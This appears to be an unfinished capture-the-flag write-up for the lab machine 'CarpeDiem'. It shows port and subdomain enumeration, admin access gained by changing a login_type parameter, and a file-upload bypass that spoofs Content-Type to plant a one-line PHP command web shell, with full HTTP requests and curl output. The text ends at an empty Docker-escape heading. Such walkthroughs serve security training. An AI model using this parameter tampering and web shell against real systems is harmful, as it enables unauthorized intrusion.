# CarpeDiem (WIP)

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.179
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 05:45 EDT
Nmap scan report for 10.129.227.179
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Enum

Port 80 hosted a website that had a countdown to a domain being launched.

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

There was nothing interesting about this website. The search there is static. We can do a `gobuster` directory and `wfuzz` subdomain scan. `gobuster` only picked up on static site files, but `wfuzz` picked up on a `portal` endpoint:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.carpediem.htb' --hw=161 -u http://carpediem.htb  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://carpediem.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000048:   200        462 L    2174 W     31090 Ch    "portal"
```

### Admin Bypass --> File Upload

This was running some motorcycle store portal:

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

We can create an account with the site. After registering, we can update our profile:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

This is the request generated:

{% code overflow="wrap" %}
```http
POST /classes/Master.php?f=update_account HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 115
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/?p=edit_account
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a



id=25&login_type=2&firstname=test&lastname=test&contact=test&gender=Male&address=test123&username=test123&password=
```
{% endcode %}

There's a `login_type` parameter set at 2, so let's change that to 1 and we might become an administrator. I tested this by visiting `/admin` and it worked:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

When looking around, we can see there's a Quartely Sales Report part hwhere we can upload files:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

The upload functions still being in development might mean this is vulnerable. I tried clicking on Add, but it did nothing. When inspecting the traffic, we can see it making POST requests to `/classes/users.php?f=upload`.&#x20;

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

This accepts form-data and also is a PHP-based website (as from X-Powered-By), so let's try to upload a PHP webshell. I took some requests I had from other machines / scripts that also uploaded form-data.&#x20;

```http
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 268

-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name="file_upload"; filename="a.html"
Content-Type: text/html

<!DOCTYPE html><title>Content of a.html.</title>

-----------------------------9051914041544843365972754266--
```

The above request works and it will be uploaded:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Now we can try to upload a PHP webshell using an image in `Content-Type` because there's a check for that.&#x20;

```http
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Origin: http://portal.carpediem.htb
Connection: close
Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
Content-Length: 253



-----------------------------9051914041544843365972754266
Content-Disposition: form-data; name="file_upload"; filename="b.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>

-----------------------------9051914041544843365972754266--
```

Then we can verify it works:

```
$ curl http://portal.carpediem.htb/uploads/1683799320_b.php?cmd=id      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then, we can get an easy reverse shell.

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Docker Escape

### MySQL Creds

